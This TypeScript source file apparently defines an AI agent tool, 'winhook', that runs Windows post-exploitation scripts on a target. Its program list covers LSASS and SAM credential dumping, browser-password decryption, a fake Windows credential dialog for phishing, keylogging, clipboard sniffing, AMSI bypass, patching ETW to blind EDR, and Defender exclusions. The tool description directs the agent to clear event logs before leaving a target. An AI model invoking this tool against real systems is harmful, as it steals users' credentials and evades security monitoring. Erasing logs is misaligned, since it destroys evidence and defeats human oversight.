import z from "zod"
import { Tool } from "./tool"
import path from "path"

const WINHOOK_DIR = path.resolve(import.meta.dir, "../../data/winhook")

const AVAILABLE_PROGRAMS: Record<string, { description: string; args: string }> = {
  lsass_dump: {
    description:
      "Dump LSASS process memory for credential extraction using MiniDumpWriteDump or comsvcs.dll — extracts NTLM hashes, Kerberos tickets, and plaintext passwords",
    args: "[--method comsvcs|minidump] [--outfile PATH] [--json-output]",
  },
  sam_dump: {
    description:
      "Extract SAM, SYSTEM, and SECURITY registry hives for offline password cracking with secretsdump or hashcat",
    args: "[--outdir PATH] [--json-output]",
  },
  dpapi_extract: {
    description:
      "Decrypt DPAPI-protected secrets — Chrome/Edge saved passwords, WiFi keys, Windows Credential Vault, and application credentials",
    args: "[--scope user|machine] [--browser chrome|edge|all] [--json-output]",
  },
  credential_prompt: {
    description:
      "Spawn a fake Windows credential dialog via CredUIPromptForCredentials to phish the current user's password",
    args: "[--message TEXT] [--title TEXT] [--json-output]",
  },
  keylog_win: {
    description:
      "Capture keystrokes via SetWindowsHookEx with WH_KEYBOARD_LL — logs keystrokes with window title context",
    args: "[--duration SECONDS] [--json-output]",
  },
  etw_process: {
    description:
      "Monitor process creation and termination via ETW Microsoft-Windows-Kernel-Process provider — capture PID, PPID, image path, command line",
    args: "[--duration SECONDS] [--json-output]",
  },
  etw_network: {
    description:
      "Monitor network connections via ETW Microsoft-Windows-Kernel-Network provider — capture source/dest IP, port, PID, protocol",
    args: "[--duration SECONDS] [--json-output]",
  },
  clipboard_sniff: {
    description:
      "Monitor clipboard contents for passwords, API tokens, and sensitive data copied by users — polls at configurable interval",
    args: "[--duration SECONDS] [--interval SECONDS] [--json-output]",
  },
  amsi_bypass: {
    description:
      "Bypass AMSI (Antimalware Scan Interface) by patching AmsiScanBuffer in memory — enables undetected PowerShell script execution",
    args: "[--method patch|reflection|clr] [--json-output]",
  },
  etw_blind: {
    description:
      "Patch NtTraceEvent / EtwEventWrite in ntdll.dll to blind EDR and AV monitoring in the current process",
    args: "[--json-output]",
  },
  defender_exclude: {
    description:
      "Add exclusion paths to Windows Defender via PowerShell to prevent scanning of CyberStrike tools and payloads",
    args: "--path PATH [--json-output]",
  },
  cleanup_win: {
    description:
      "Remove CyberStrike artifacts — clear Security/System/Application event logs, remove scheduled tasks, restore AMSI/ETW patches. ALWAYS run before leaving a target",
    args: "[--json-output]",
  },
}

export const WinhookTool = Tool.define("winhook", {
  description: `Execute a Windows post-exploitation program for userland credential harvesting, monitoring, and stealth operations. Requires Administrator privileges on the target. Available programs: ${Object.keys(AVAILABLE_PROGRAMS).join(", ")}. No kernel driver signing needed — all techniques use userland APIs. ALWAYS run cleanup_win before leaving a target.`,
  parameters: z.object({
    program: z.enum(Object.keys(AVAILABLE_PROGRAMS) as [string, ...string[]]).describe(
      "Windows post-exploitation program to execute. Options: " +
        Object.entries(AVAILABLE_PROGRAMS)
          .map(([k, v]) => `${k} — ${v.description}`)
          .join("; "),
    ),
    args: z.array(z.string()).describe("Arguments to pass to the program"),
    timeout_seconds: z
      .number()
      .optional()
      .default(120)
      .describe("Maximum execution time in seconds (default: 120)"),
  }),
  async execute(params) {
    if (process.platform !== "win32") {
      return {
        title: `winhook: ${params.program}`,
        output: `winhook requires Windows. Current platform: ${process.platform}\n\nUse 'ebpf' for Linux post-exploitation or 'machook' for macOS.`,
        metadata: { program: params.program, exitCode: -1, hasStderr: false },
      }
    }

    const ps1Path = path.join(WINHOOK_DIR, `${params.program}.ps1`)
    const pyPath = path.join(WINHOOK_DIR, `${params.program}.py`)
    const isPs1 = await Bun.file(ps1Path).exists()
    const isPy = !isPs1 && (await Bun.file(pyPath).exists())

    if (!isPs1 && !isPy) {
      return {
        title: `winhook: ${params.program}`,
        output: `Program not found: ${params.program}\n\nAvailable programs:\n${Object.entries(AVAILABLE_PROGRAMS)
          .map(([k, v]) => `  ${k}: ${v.description}\n    Usage: ${v.args}`)
          .join("\n")}`,
        metadata: { program: params.program, exitCode: -1, hasStderr: false },
      }
    }

    const cmd = isPs1
      ? ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", ps1Path, ...params.args]
      : ["python3", pyPath, ...params.args]

    const proc = Bun.spawn(cmd, {
      stdout: "pipe",
      stderr: "pipe",
      env: { ...process.env, PYTHONDONTWRITEBYTECODE: "1" },
    })

    const timeout = setTimeout(() => {
      proc.kill()
    }, params.timeout_seconds * 1000)

    const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])

    clearTimeout(timeout)
    const exitCode = await proc.exited

    const output = [stdout]
    if (stderr.trim()) output.push(`\n--- stderr ---\n${stderr}`)
    if (exitCode !== 0) {
      output.push(`\nExit code: ${exitCode}`)
      if (exitCode === 1 && (stderr.includes("Administrator") || stderr.includes("Access is denied"))) {
        output.push(
          "\n⚠ This program requires Administrator privileges. Ensure you have escalated before using winhook tools.",
        )
      }
    }

    return {
      title: `winhook: ${params.program}`,
      output: output.join(""),
      metadata: {
        program: params.program,
        exitCode,
        hasStderr: stderr.trim().length > 0,
      },
    }
  },
})
